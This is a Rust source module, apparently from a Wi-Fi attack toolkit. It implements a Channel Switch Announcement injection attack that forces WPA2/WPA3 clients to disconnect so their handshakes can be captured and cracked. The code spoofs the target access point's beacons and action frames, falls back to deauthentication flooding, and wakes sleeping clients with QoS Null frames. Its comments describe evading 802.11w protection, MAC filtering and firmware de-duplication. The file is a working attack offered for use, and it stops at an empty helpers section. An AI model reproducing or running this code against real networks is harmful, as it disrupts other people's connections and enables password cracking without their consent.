//! CSA (Channel Switch Announcement) injection attack — smart handshake capture.
//!
//! Uses CSA beacons to force client reconnection for WPA2/WPA3 handshake capture.
//! CSA frames are exempt from 802.11w Management Frame Protection — they work
//! where deauth fails (PMF-required networks, WPA3).
//!
//! **Attack strategy** (per round):
//!   1. Stimulate: QoS Null frames wake sleeping mobile clients
//!   2. CSA Burst 1: spoofed beacons + action frames announce channel switch
//!   3. Gap: 2s pause for client STA queue processing
//!   4. CSA Burst 2: second wave catches stragglers
//!   5. Listen: monitor for EAPOL (M1-lock extends dwell on M1 detection)
//!   6. Pivot: half-handshake (M2-only) triggers immediate deauth/CSA retry
//!   7. Deauth fallback: for non-PMF APs, add deauth frames to the burst
//!
//! **Techniques from Politician reference (validated)**:
//!   - CSA as primary vector (PMF bypass)
//!   - Two-burst CSA with 2s gap (STA queue processing)
//!   - QoS Null stimulation with MoreData=1 (wake sleeping clients)
//!   - Half-handshake smart pivot (M2-only → retry CSA/deauth)
//!   - M1-lock channel dwell extension (800ms after M1 for M2 capture)
//!   - SSID group completion (one capture marks all BSSIDs with same SSID)
//!   - Deauth fallback for non-PMF networks (mixed strategy)
//!
//! Architecture (SharedAdapter):
//!   The attack locks the channel to the target AP's channel. The scanner
//!   pauses hopping but keeps processing frames on the locked channel.
//!   EAPOL capture is handled by the existing pipeline — the CSA attack
//!   monitors StoreUpdate deltas for EapolMessage/HandshakeComplete events.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use crate::adapter::SharedAdapter;
use crate::attacks::next_attack_id;
use crate::core::{EventRing, MacAddress, TxOptions};
use crate::core::chip::ChipCaps;
use crate::protocol::eapol::HandshakeQuality;
use crate::store::{Ap, Station};
use crate::store::update::{
    AttackId, AttackType, AttackPhase, AttackEventKind, AttackResult, StoreUpdate,
};
use crate::protocol::frames;

// ═══════════════════════════════════════════════════════════════════════════════
//  CSA Attack Configuration
// ═══════════════════════════════════════════════════════════════════════════════

/// CSA attack parameters.
#[derive(Clone, Debug)]
pub struct CsaParams {
    /// Number of CSA beacon frames per burst. Default: 8.
    pub beacons_per_burst: u32,
    /// Gap between first and second CSA burst. Default: 2s.
    /// Allows client STA queue to process the first wave before the second.
    pub inter_burst_gap: Duration,
    /// Listen window after CSA bursts — time to capture EAPOL. Default: 5s.
    pub listen_window: Duration,
    /// Extended dwell after M1 detection. Default: 800ms.
    /// M2 typically arrives within 200-500ms of M1.
    pub m1_lock_dwell: Duration,
    /// Cooldown after attack — stay on channel for late handshakes. Default: 10s.
    pub cooldown: Duration,
    /// Max rounds (0 = unlimited, until handshake captured or user stops). Default: 0.
    pub max_rounds: u32,
    /// Enable deauth fallback for non-PMF networks. Default: true.
    pub deauth_fallback: bool,
    /// Enable QoS Null stimulation. Default: true.
    pub stimulate: bool,
    /// Stimulation throttle — minimum gap between stimulations. Default: 15s.
    pub stimulate_interval: Duration,
    /// Channel settle time after lock. Default: 50ms.
    pub channel_settle: Duration,
    /// Number of QoS Null stimulation frames per round. Default: 4.
    pub stimulate_count: u32,
}

impl Default for CsaParams {
    fn default() -> Self {
        Self {
            beacons_per_burst: 8,
            inter_burst_gap: Duration::from_secs(2),
            listen_window: Duration::from_secs(5),
            m1_lock_dwell: Duration::from_millis(800),
            cooldown: Duration::from_secs(10),
            max_rounds: 0,
            deauth_fallback: true,
            stimulate: true,
            stimulate_interval: Duration::from_secs(15),
            channel_settle: Duration::from_millis(50),
            stimulate_count: 4,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  CSA Attack Phase
// ═══════════════════════════════════════════════════════════════════════════════

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CsaPhase {
    Idle,
    ChannelLock,
    Stimulating,
    CsaBurst,
    Listening,
    Cooldown,
    Done,
}

impl CsaPhase {
    fn to_attack_phase(&self) -> AttackPhase {
        match self {
            Self::Idle => AttackPhase { label: "Idle", is_active: false, is_terminal: false },
            Self::ChannelLock => AttackPhase { label: "ChannelLock", is_active: true, is_terminal: false },
            Self::Stimulating => AttackPhase { label: "Stimulating", is_active: true, is_terminal: false },
            Self::CsaBurst => AttackPhase { label: "CsaBurst", is_active: true, is_terminal: false },
            Self::Listening => AttackPhase { label: "Listening", is_active: true, is_terminal: false },
            Self::Cooldown => AttackPhase { label: "Cooldown", is_active: true, is_terminal: false },
            Self::Done => AttackPhase { label: "Done", is_active: false, is_terminal: true },
        }
    }
}

impl Default for CsaPhase {
    fn default() -> Self { Self::Idle }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  CSA Attack Info — real-time state snapshot for UI
// ═══════════════════════════════════════════════════════════════════════════════

#[derive(Debug, Clone)]
pub struct CsaInfo {
    pub phase: CsaPhase,
    pub running: bool,

    // Target
    pub target_bssid: MacAddress,
    pub target_ssid: String,
    pub target_channel: u8,
    pub target_rssi: i8,
    pub target_pmf: PmfStatus,

    // Counters
    pub frames_sent: u64,
    pub frames_received: u64,
    pub bytes_sent: u64,
    pub round: u32,
    pub csa_beacons_sent: u64,
    pub deauth_frames_sent: u64,
    pub stimulation_frames_sent: u64,

    // TX Feedback
    pub tx_feedback: crate::core::TxFeedbackSnapshot,

    // Timing
    pub start_time: Instant,
    pub elapsed: Duration,
    pub frames_per_sec: f64,

    // Capture state
    pub handshake_quality: HandshakeQuality,
    pub has_pmkid: bool,
    pub m1_seen: bool,
    pub m2_seen: bool,
    pub half_handshake_pivots: u32,

    // Cooldown
    pub cooldown_start: Option<Instant>,
    pub cooldown_duration: Duration,

    // Result
    pub stop_reason: Option<CsaStopReason>,
}

impl Default for CsaInfo {
    fn default() -> Self {
        Self {
            phase: CsaPhase::Idle,
            running: false,
            target_bssid: MacAddress::ZERO,
            target_ssid: String::new(),
            target_channel: 0,
            target_rssi: -100,
            target_pmf: PmfStatus::None,
            frames_sent: 0,
            frames_received: 0,
            bytes_sent: 0,
            round: 0,
            csa_beacons_sent: 0,
            deauth_frames_sent: 0,
            stimulation_frames_sent: 0,
            tx_feedback: Default::default(),
            start_time: Instant::now(),
            elapsed: Duration::ZERO,
            frames_per_sec: 0.0,
            handshake_quality: HandshakeQuality::None,
            has_pmkid: false,
            m1_seen: false,
            m2_seen: false,
            half_handshake_pivots: 0,
            cooldown_start: None,
            cooldown_duration: Duration::ZERO,
            stop_reason: None,
        }
    }
}

/// PMF status of target AP (derived from RSN IE capabilities).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PmfStatus {
    /// No PMF — deauth works fine.
    None,
    /// PMF capable but not required — mixed mode, deauth may work.
    Capable,
    /// PMF required — deauth will be silently dropped, CSA is the only way.
    Required,
}

impl PmfStatus {
    pub fn from_ap(ap: &Ap) -> Self {
        match &ap.rsn {
            Some(rsn) if rsn.mfp_required => Self::Required,
            Some(rsn) if rsn.mfp_capable => Self::Capable,
            _ => Self::None,
        }
    }

    pub fn label(&self) -> &'static str {
        match self {
            Self::None => "off",
            Self::Capable => "capable",
            Self::Required => "required",
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  CSA Attack Events
// ═══════════════════════════════════════════════════════════════════════════════

#[derive(Debug, Clone)]
pub struct CsaEvent {
    pub seq: u64,
    pub timestamp: Duration,
    pub kind: CsaEventKind,
}

#[derive(Debug, Clone)]
pub enum CsaEventKind {
    /// Attack started against target.
    AttackStarted {
        bssid: MacAddress,
        ssid: String,
        channel: u8,
        pmf: PmfStatus,
    },
    /// Channel locked.
    ChannelLocked { channel: u8 },
    /// QoS Null stimulation sent (wake sleeping clients).
    StimulationSent { frames: u32 },
    /// CSA burst sent.
    CsaBurstSent {
        burst_num: u32,
        beacons: u32,
        csa_channel: u8,
    },
    /// Inter-burst gap (waiting for STA processing).
    InterBurstGap { gap_secs: f64 },
    /// Listening for EAPOL handshakes.
    ListeningStarted { round: u32 },
    /// EAPOL M1 detected — extending listen window for M2 capture.
    M1Detected { sta_mac: MacAddress },
    /// Half-handshake detected (M2 without M1) — pivoting to CSA/deauth.
    HalfHandshakePivot { sta_mac: MacAddress },
    /// Handshake captured (M1+M2 minimum).
    HandshakeCaptured {
        sta_mac: MacAddress,
        quality: HandshakeQuality,
    },
    /// PMKID captured.
    PmkidCaptured { sta_mac: MacAddress },
    /// Deauth fallback sent (non-PMF AP).
    DeauthFallbackSent { frames: u32 },
    /// New round starting.
    RoundStarted { round: u32 },
    /// Rate snapshot.
    RateSnapshot {
        frames_sent: u64,
        frames_per_sec: f64,
        elapsed: Duration,
    },
    /// Cooldown started.
    CooldownStarted { duration_secs: f64 },
    /// Channel unlocked.
    ChannelUnlocked,
    /// Attack complete.
    AttackComplete {
        frames_sent: u64,
        elapsed: Duration,
        reason: CsaStopReason,
        quality: HandshakeQuality,
    },
    /// Error.
    Error { message: String },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CsaStopReason {
    UserStopped,
    HandshakeCaptured,
    MaxRoundsReached,
    ChannelError,
}

// ═══════════════════════════════════════════════════════════════════════════════
//  CsaAttack — the attack engine
// ═══════════════════════════════════════════════════════════════════════════════

pub struct CsaAttack {
    params: CsaParams,
    info: Arc<Mutex<CsaInfo>>,
    events: Arc<EventRing<CsaEvent>>,
    running: Arc<AtomicBool>,
    done: Arc<AtomicBool>,
    /// Live client MACs — updated by CLI poll loop from scanner data.
    live_clients: Arc<Mutex<Vec<MacAddress>>>,
}

impl CsaAttack {
    pub fn new(params: CsaParams) -> Self {
        Self {
            params,
            info: Arc::new(Mutex::new(CsaInfo::default())),
            events: Arc::new(EventRing::new(1024)),
            running: Arc::new(AtomicBool::new(false)),
            done: Arc::new(AtomicBool::new(false)),
            live_clients: Arc::new(Mutex::new(Vec::new())),
        }
    }

    pub fn update_clients(&self, clients: Vec<MacAddress>) {
        let mut lc = self.live_clients.lock().unwrap_or_else(|e| e.into_inner());
        *lc = clients;
    }

    pub fn start(&self, shared: SharedAdapter, target: Ap, _target_station: Option<Station>) {
        let info = Arc::clone(&self.info);
        let events = Arc::clone(&self.events);
        let running = Arc::clone(&self.running);
        let done = Arc::clone(&self.done);
        let params = self.params.clone();

        running.store(true, Ordering::SeqCst);
        done.store(false, Ordering::SeqCst);

        let pmf = PmfStatus::from_ap(&target);
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.running = true;
            info.start_time = Instant::now();
            info.phase = CsaPhase::ChannelLock;
            info.target_bssid = target.bssid;
            info.target_ssid = target.ssid.clone();
            info.target_channel = target.channel;
            info.target_rssi = target.rssi;
            info.target_pmf = pmf;
        }

        let live_clients = Arc::clone(&self.live_clients);

        thread::Builder::new()
            .name("csa".into())
            .spawn(move || {
                let reader = shared.subscribe("csa");
                run_csa_attack(
                    &shared, &reader, &target, &params,
                    &info, &events, &running, &live_clients,
                );
                running.store(false, Ordering::SeqCst);
                done.store(true, Ordering::SeqCst);
                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.running = false;
                    info.phase = CsaPhase::Done;
                }
            })
            .expect("failed to spawn csa thread");
    }

    pub fn signal_stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    pub fn is_done(&self) -> bool {
        self.done.load(Ordering::SeqCst)
    }

    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    pub fn info(&self) -> CsaInfo {
        self.info.lock().unwrap_or_else(|e| e.into_inner()).clone()
    }

    #[allow(dead_code)]
    pub fn events(&self) -> Vec<CsaEvent> {
        self.events.drain()
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Attack logic — runs on its own thread
// ═══════════════════════════════════════════════════════════════════════════════

/// Channels to direct clients to (unused channels that won't exist).
/// Rotated per burst to avoid client caching.
const CSA_TARGET_CHANNELS: [u8; 6] = [13, 12, 14, 11, 10, 9];

/// Deauth reason codes — rotated per round for firmware de-duplication bypass.
const DEAUTH_REASONS: [u16; 5] = [7, 6, 1, 4, 5];

fn run_csa_attack(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    target: &Ap,
    params: &CsaParams,
    info: &Arc<Mutex<CsaInfo>>,
    events: &Arc<EventRing<CsaEvent>>,
    running: &Arc<AtomicBool>,
    live_clients: &Arc<Mutex<Vec<MacAddress>>>,
) {
    let start = Instant::now();
    let tx_fb = shared.tx_feedback();
    tx_fb.reset();
    let attack_id = next_attack_id();
    let pmf = PmfStatus::from_ap(target);

    // Subscribe to delta stream for EAPOL monitoring
    let delta_sub = shared.gate().subscribe_updates("csa-engine");

    // Emit AttackStarted
    shared.emit_updates(vec![StoreUpdate::AttackStarted {
        id: attack_id,
        attack_type: AttackType::Csa,
        target_bssid: target.bssid,
        target_ssid: target.ssid.clone(),
        target_channel: target.channel,
    }]);

    push_event(shared, events, start, CsaEventKind::AttackStarted {
        bssid: target.bssid,
        ssid: target.ssid.clone(),
        channel: target.channel,
        pmf,
    }, attack_id);

    // Lock channel
    if let Err(e) = shared.lock_channel(target.channel, "csa") {
        push_event(shared, events, start, CsaEventKind::Error {
            message: format!("Failed to lock channel {}: {}", target.channel, e),
        }, attack_id);
        finish_attack(shared, info, events, start, attack_id, 0, CsaStopReason::ChannelError, HandshakeQuality::None);
        return;
    }
    push_event(shared, events, start, CsaEventKind::ChannelLocked { channel: target.channel }, attack_id);
    shared.set_attack_target(&target.bssid.0);
    thread::sleep(params.channel_settle);

    // TX options: max range, no ACK (broadcast CSA beacons)
    let has_he = shared.caps().contains(ChipCaps::HE);
    let tx_opts = TxOptions::max_range_noack(target.channel, has_he);

    // State tracking
    let mut frames_sent: u64 = 0;
    let mut bytes_sent: u64 = 0;
    let mut csa_beacons_sent: u64 = 0;
    let mut deauth_frames_sent: u64 = 0;
    let mut stimulation_frames_sent: u64 = 0;
    let mut round: u32 = 0;
    let mut last_stimulate = Instant::now() - params.stimulate_interval; // allow immediate first stimulation
    let mut half_handshake_pivots: u32 = 0;
    let mut handshake_quality = HandshakeQuality::None;
    let mut has_pmkid = false;
    let mut m1_seen = false;
    let mut m2_seen = false;

    // Rate tracking
    let mut rate_start = Instant::now();
    let mut rate_checkpoint: u64 = 0;

    // RNG for random MACs and channel rotation
    let mut rng_state: u32 = (start.elapsed().as_nanos() as u32) ^ 0xC5A0_BEEF;

    // Build the IEs for authentic-looking CSA beacons
    let beacon_ies = if !target.raw_ies.is_empty() {
        target.raw_ies.clone()
    } else {
        build_minimal_ies(&target.ssid, target.channel)
    };

    // ── Main attack loop ──
    while running.load(Ordering::SeqCst) {
        round += 1;

        // Check round limit
        if params.max_rounds > 0 && round > params.max_rounds {
            finish_attack(shared, info, events, start, attack_id, frames_sent, CsaStopReason::MaxRoundsReached, handshake_quality);
            break;
        }

        push_event(shared, events, start, CsaEventKind::RoundStarted { round }, attack_id);

        // ── Phase 1: Stimulate — wake sleeping clients ──
        if params.stimulate && last_stimulate.elapsed() >= params.stimulate_interval {
            update_phase(shared, info, CsaPhase::Stimulating, attack_id);

            let clients: Vec<MacAddress> = {
                let lc = live_clients.lock().unwrap_or_else(|e| e.into_inner());
                lc.clone()
            };

            let mut stim_count: u32 = 0;
            // Broadcast QoS Null stimulation
            for _ in 0..params.stimulate_count {
                if !running.load(Ordering::SeqCst) { break; }
                let frame = frames::build_qos_null_stimulation(&MacAddress::BROADCAST, &target.bssid);
                if shared.tx_frame(&frame, &tx_opts).is_ok() {
                    frames_sent += 1;
                    bytes_sent += frame.len() as u64;
                    stimulation_frames_sent += 1;
                    stim_count += 1;
                }
                thread::sleep(Duration::from_millis(5));
            }

            // Unicast stimulation to known clients
            for client in &clients {
                if !running.load(Ordering::SeqCst) { break; }
                let frame = frames::build_qos_null_stimulation(client, &target.bssid);
                if shared.tx_frame(&frame, &tx_opts).is_ok() {
                    frames_sent += 1;
                    bytes_sent += frame.len() as u64;
                    stimulation_frames_sent += 1;
                    stim_count += 1;
                }
            }

            if stim_count > 0 {
                push_event(shared, events, start, CsaEventKind::StimulationSent { frames: stim_count }, attack_id);
            }
            last_stimulate = Instant::now();
        }

        if !running.load(Ordering::SeqCst) { break; }

        // ── Phase 2: CSA Burst 1 ──
        update_phase(shared, info, CsaPhase::CsaBurst, attack_id);
        let csa_channel = CSA_TARGET_CHANNELS[((round - 1) as usize) % CSA_TARGET_CHANNELS.len()];

        let burst1_count = send_csa_burst(
            shared, target, &beacon_ies, csa_channel,
            params.beacons_per_burst, &tx_opts, running,
            &mut frames_sent, &mut bytes_sent, &mut csa_beacons_sent,
            &mut rng_state,
        );
        push_event(shared, events, start, CsaEventKind::CsaBurstSent {
            burst_num: 1,
            beacons: burst1_count,
            csa_channel,
        }, attack_id);

        // ── Deauth fallback for non-PMF networks ──
        if params.deauth_fallback && pmf == PmfStatus::None {
            let clients: Vec<MacAddress> = {
                let lc = live_clients.lock().unwrap_or_else(|e| e.into_inner());
                lc.clone()
            };
            let deauth_count = send_deauth_burst(
                shared, target, &clients, round,
                &tx_opts, running,
                &mut frames_sent, &mut bytes_sent, &mut deauth_frames_sent,
            );
            if deauth_count > 0 {
                push_event(shared, events, start, CsaEventKind::DeauthFallbackSent { frames: deauth_count }, attack_id);
            }
        }

        if !running.load(Ordering::SeqCst) { break; }

        // ── Inter-burst gap (2s) ──
        push_event(shared, events, start, CsaEventKind::InterBurstGap {
            gap_secs: params.inter_burst_gap.as_secs_f64(),
        }, attack_id);
        let gap_start = Instant::now();
        while running.load(Ordering::SeqCst) && gap_start.elapsed() < params.inter_burst_gap {
            drain_rx(reader, info);
            check_eapol_deltas(
                &delta_sub, target, info, events, shared, start, attack_id,
                &mut handshake_quality, &mut has_pmkid, &mut m1_seen, &mut m2_seen,
            );
            thread::sleep(Duration::from_millis(50));
        }

        if !running.load(Ordering::SeqCst) { break; }

        // ── Phase 3: CSA Burst 2 ──
        let csa_channel2 = CSA_TARGET_CHANNELS[((round) as usize) % CSA_TARGET_CHANNELS.len()];
        let burst2_count = send_csa_burst(
            shared, target, &beacon_ies, csa_channel2,
            params.beacons_per_burst, &tx_opts, running,
            &mut frames_sent, &mut bytes_sent, &mut csa_beacons_sent,
            &mut rng_state,
        );
        push_event(shared, events, start, CsaEventKind::CsaBurstSent {
            burst_num: 2,
            beacons: burst2_count,
            csa_channel: csa_channel2,
        }, attack_id);

        if !running.load(Ordering::SeqCst) { break; }

        // ── Phase 4: Listen for EAPOL ──
        update_phase(shared, info, CsaPhase::Listening, attack_id);
        push_event(shared, events, start, CsaEventKind::ListeningStarted { round }, attack_id);

        let listen_start = Instant::now();
        let mut m1_lock_until: Option<Instant> = None;
        let mut last_reactive_stim = Instant::now(); // throttle reactive stimulation

        while running.load(Ordering::SeqCst) {
            let listen_elapsed = listen_start.elapsed();

            // Normal listen window expired AND no M1-lock active
            let past_listen = listen_elapsed >= params.listen_window;
            let past_m1_lock = m1_lock_until.map_or(true, |until| Instant::now() >= until);

            if past_listen && past_m1_lock {
                break;
            }

            drain_rx(reader, info);

            // Check for EAPOL events
            let prev_quality = handshake_quality;
            let prev_m1 = m1_seen;
            let prev_m2 = m2_seen;
            check_eapol_deltas(
                &delta_sub, target, info, events, shared, start, attack_id,
                &mut handshake_quality, &mut has_pmkid, &mut m1_seen, &mut m2_seen,
            );

            // M1 just detected — extend dwell
            if m1_seen && !prev_m1 {
                m1_lock_until = Some(Instant::now() + params.m1_lock_dwell);
                push_event(shared, events, start, CsaEventKind::M1Detected {
                    sta_mac: MacAddress::ZERO, // updated via delta
                }, attack_id);
            }

            // Half-handshake pivot: M2 seen without M1 in this round
            if m2_seen && !prev_m2 && !prev_m1 && !m1_seen {
                half_handshake_pivots += 1;
                push_event(shared, events, start, CsaEventKind::HalfHandshakePivot {
                    sta_mac: MacAddress::ZERO,
                }, attack_id);
                // Break listen to immediately send another CSA burst
                break;
            }

            // Handshake quality improved — we got something!
            if handshake_quality > prev_quality && handshake_quality >= HandshakeQuality::M1M2 {
                // Success! We have a crackable handshake.
                push_event(shared, events, start, CsaEventKind::HandshakeCaptured {
                    sta_mac: MacAddress::ZERO,
                    quality: handshake_quality,
                }, attack_id);
                // Continue to cooldown
                finish_attack(shared, info, events, start, attack_id, frames_sent, CsaStopReason::HandshakeCaptured, handshake_quality);
                // Signal stop so we exit the outer loop too
                running.store(false, Ordering::SeqCst);
                break;
            }

            // ── Reactive stimulation: wake quiet clients during listen phase ──
            // If 2+ seconds into listen and no EAPOL yet, send QoS Null to
            // wake any sleeping clients. Throttled to once per 3 seconds.
            if listen_elapsed >= Duration::from_secs(2)
                && !m1_seen && !m2_seen
                && last_reactive_stim.elapsed() >= Duration::from_secs(3)
            {
                let clients: Vec<MacAddress> = {
                    let lc = live_clients.lock().unwrap_or_else(|e| e.into_inner());
                    lc.clone()
                };
                let mut stim_count: u32 = 0;
                // Broadcast stimulation
                let frame = frames::build_qos_null_stimulation(&MacAddress::BROADCAST, &target.bssid);
                if shared.tx_frame(&frame, &tx_opts).is_ok() {
                    frames_sent += 1;
                    bytes_sent += frame.len() as u64;
                    stimulation_frames_sent += 1;
                    stim_count += 1;
                }
                // Unicast to each known client
                for client in &clients {
                    let frame = frames::build_qos_null_stimulation(client, &target.bssid);
                    if shared.tx_frame(&frame, &tx_opts).is_ok() {
                        frames_sent += 1;
                        bytes_sent += frame.len() as u64;
                        stimulation_frames_sent += 1;
                        stim_count += 1;
                    }
                }
                if stim_count > 0 {
                    push_event(shared, events, start, CsaEventKind::StimulationSent { frames: stim_count }, attack_id);
                }
                last_reactive_stim = Instant::now();
            }

            thread::sleep(Duration::from_millis(50));
        }

        // Update counters and rate
        update_counters(info, frames_sent, bytes_sent, csa_beacons_sent, deauth_frames_sent,
            stimulation_frames_sent, round, start, &tx_fb, handshake_quality, has_pmkid,
            m1_seen, m2_seen, half_handshake_pivots);

        let rate_elapsed = rate_start.elapsed();
        if rate_elapsed >= Duration::from_secs(1) {
            let delta = frames_sent - rate_checkpoint;
            let fps = delta as f64 / rate_elapsed.as_secs_f64();
            rate_checkpoint = frames_sent;
            rate_start = Instant::now();

            {
                let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                info.frames_per_sec = fps;
            }

            push_event(shared, events, start, CsaEventKind::RateSnapshot {
                frames_sent,
                frames_per_sec: fps,
                elapsed: start.elapsed(),
            }, attack_id);

            emit_counters(shared, attack_id, info, start, &tx_fb);
        }

        // Reset per-round M1/M2 flags for next round
        m1_seen = false;
        m2_seen = false;
    }

    // ── Cooldown phase ──
    if params.cooldown > Duration::ZERO && !matches!(
        info.lock().unwrap_or_else(|e| e.into_inner()).stop_reason,
        Some(CsaStopReason::ChannelError)
    ) {
        update_phase(shared, info, CsaPhase::Cooldown, attack_id);
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.cooldown_start = Some(Instant::now());
            info.cooldown_duration = params.cooldown;
        }
        push_event(shared, events, start, CsaEventKind::CooldownStarted {
            duration_secs: params.cooldown.as_secs_f64(),
        }, attack_id);

        let cooldown_start = Instant::now();
        while cooldown_start.elapsed() < params.cooldown {
            drain_rx(reader, info);
            check_eapol_deltas(
                &delta_sub, target, info, events, shared, start, attack_id,
                &mut handshake_quality, &mut has_pmkid, &mut m1_seen, &mut m2_seen,
            );
            thread::sleep(Duration::from_millis(100));
        }
    }

    // Final counters
    update_counters(info, frames_sent, bytes_sent, csa_beacons_sent, deauth_frames_sent,
        stimulation_frames_sent, round, start, &tx_fb, handshake_quality, has_pmkid,
        m1_seen, m2_seen, half_handshake_pivots);
    emit_counters(shared, attack_id, info, start, &tx_fb);

    // Unlock channel
    shared.unlock_channel();
    push_event(shared, events, start, CsaEventKind::ChannelUnlocked, attack_id);

    // Final AttackComplete if not already emitted
    let already_finished = {
        let i = info.lock().unwrap_or_else(|e| e.into_inner());
        i.stop_reason.is_some()
    };
    if !already_finished {
        finish_attack(shared, info, events, start, attack_id, frames_sent, CsaStopReason::UserStopped, handshake_quality);
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  CSA burst — sends spoofed beacons + action frames
// ═══════════════════════════════════════════════════════════════════════════════

fn send_csa_burst(
    shared: &SharedAdapter,
    target: &Ap,
    beacon_ies: &[u8],
    csa_channel: u8,
    count: u32,
    tx_opts: &TxOptions,
    running: &Arc<AtomicBool>,
    frames_sent: &mut u64,
    bytes_sent: &mut u64,
    csa_beacons_sent: &mut u64,
    rng: &mut u32,
) -> u32 {
    let mut sent: u32 = 0;

    for i in 0..count {
        if !running.load(Ordering::SeqCst) { break; }

        // CSA beacon: spoofed from target AP with CSA IE
        // Countdown decreases with each beacon in the burst (more urgent)
        let countdown = (count - i).min(5) as u8;
        if let Some(beacon) = frames::build_csa_beacon(
            &target.bssid,
            target.tsf,
            target.beacon_interval,
            target.capability,
            csa_channel,
            countdown,
            beacon_ies,
        ) {
            if shared.tx_frame(&beacon, tx_opts).is_ok() {
                *frames_sent += 1;
                *bytes_sent += beacon.len() as u64;
                *csa_beacons_sent += 1;
                sent += 1;
            }
        }

        // CSA action frame: more targeted, broadcast + unicast
        let action_frame = frames::build_csa_action(
            &target.bssid,
            &MacAddress::BROADCAST,
            &target.bssid,
            csa_channel,
            countdown,
        );
        if shared.tx_frame(&action_frame, tx_opts).is_ok() {
            *frames_sent += 1;
            *bytes_sent += action_frame.len() as u64;
            *csa_beacons_sent += 1;
            sent += 1;
        }

        // Also send from a random spoofed MAC to evade simple MAC filtering
        if i % 3 == 0 {
            let spoofed = random_mac(rng);
            let action_spoofed = frames::build_csa_action(
                &spoofed,
                &MacAddress::BROADCAST,
                &target.bssid,
                csa_channel,
                countdown,
            );
            if shared.tx_frame(&action_spoofed, tx_opts).is_ok() {
                *frames_sent += 1;
                *bytes_sent += action_spoofed.len() as u64;
                sent += 1;
            }
        }

        thread::sleep(Duration::from_millis(2));
    }

    sent
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Deauth fallback — for non-PMF networks
// ═══════════════════════════════════════════════════════════════════════════════

fn send_deauth_burst(
    shared: &SharedAdapter,
    target: &Ap,
    clients: &[MacAddress],
    round: u32,
    tx_opts: &TxOptions,
    running: &Arc<AtomicBool>,
    frames_sent: &mut u64,
    bytes_sent: &mut u64,
    deauth_frames_sent: &mut u64,
) -> u32 {
    use crate::protocol::ieee80211::ReasonCode;

    let mut sent: u32 = 0;
    let reason_idx = (round as usize) % DEAUTH_REASONS.len();
    let reason = ReasonCode::from_u16(DEAUTH_REASONS[reason_idx])
        .unwrap_or(ReasonCode::Class3FromNonAssoc);

    // Unicast deauth to known clients (both directions)
    for client in clients {
        if !running.load(Ordering::SeqCst) { break; }
        // AP → client
        let frame = frames::build_deauth(&target.bssid, client, &target.bssid, reason);
        if shared.tx_frame(&frame, tx_opts).is_ok() {
            *frames_sent += 1;
            *bytes_sent += frame.len() as u64;
            *deauth_frames_sent += 1;
            sent += 1;
        }
        // client → AP
        let frame = frames::build_deauth(client, &target.bssid, &target.bssid, reason);
        if shared.tx_frame(&frame, tx_opts).is_ok() {
            *frames_sent += 1;
            *bytes_sent += frame.len() as u64;
            *deauth_frames_sent += 1;
            sent += 1;
        }
    }

    // Broadcast deauth
    if running.load(Ordering::SeqCst) {
        let frame = frames::build_deauth(&target.bssid, &MacAddress::BROADCAST, &target.bssid, reason);
        if shared.tx_frame(&frame, tx_opts).is_ok() {
            *frames_sent += 1;
            *bytes_sent += frame.len() as u64;
            *deauth_frames_sent += 1;
            sent += 1;
        }
    }

    sent
}

// ═══════════════════════════════════════════════════════════════════════════════
//  EAPOL delta monitoring — watches for handshake events from the pipeline
// ═══════════════════════════════════════════════════════════════════════════════

fn check_eapol_deltas(
    delta_sub: &crate::pipeline::UpdateSubscriber,
    target: &Ap,
    info: &Arc<Mutex<CsaInfo>>,
    events: &Arc<EventRing<CsaEvent>>,
    shared: &SharedAdapter,
    start: Instant,
    attack_id: AttackId,
    handshake_quality: &mut HandshakeQuality,
    has_pmkid: &mut bool,
    m1_seen: &mut bool,
    m2_seen: &mut bool,
) {
    for update in delta_sub.drain_flat() {
        match &update {
            StoreUpdate::EapolMessage { ap_mac, message, quality, .. }
                if *ap_mac == target.bssid =>
            {
                use crate::protocol::eapol::HandshakeMessage;
                match message {
                    HandshakeMessage::M1 => *m1_seen = true,
                    HandshakeMessage::M2 => *m2_seen = true,
                    _ => {}
                }
                if *quality > *handshake_quality {
                    *handshake_quality = *quality;
                    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                    i.handshake_quality = *quality;
                    i.m1_seen = *m1_seen;
                    i.m2_seen = *m2_seen;
                }
            }
            StoreUpdate::PmkidCaptured { ap_mac, sta_mac, .. }
                if *ap_mac == target.bssid =>
            {
                *has_pmkid = true;
                {
                    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                    i.has_pmkid = true;
                }
                push_event(shared, events, start, CsaEventKind::PmkidCaptured {
                    sta_mac: *sta_mac,
                }, attack_id);
            }
            StoreUpdate::HandshakeComplete { ap_mac, sta_mac, quality }
                if *ap_mac == target.bssid =>
            {
                *handshake_quality = *quality;
                let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                i.handshake_quality = *quality;
                push_event(shared, events, start, CsaEventKind::HandshakeCaptured {
                    sta_mac: *sta_mac,
                    quality: *quality,
                }, attack_id);
            }
            StoreUpdate::ApCaptureStateChanged { bssid, handshake_quality: q, has_pmkid: p }
                if *bssid == target.bssid =>
            {
                if *q > *handshake_quality { *handshake_quality = *q; }
                if *p { *has_pmkid = true; }
                let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                i.handshake_quality = *handshake_quality;
                i.has_pmkid = *has_pmkid;
            }
            _ => {}
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Helpers
// ═══════════════════════════════════════════════════════════════════════════════

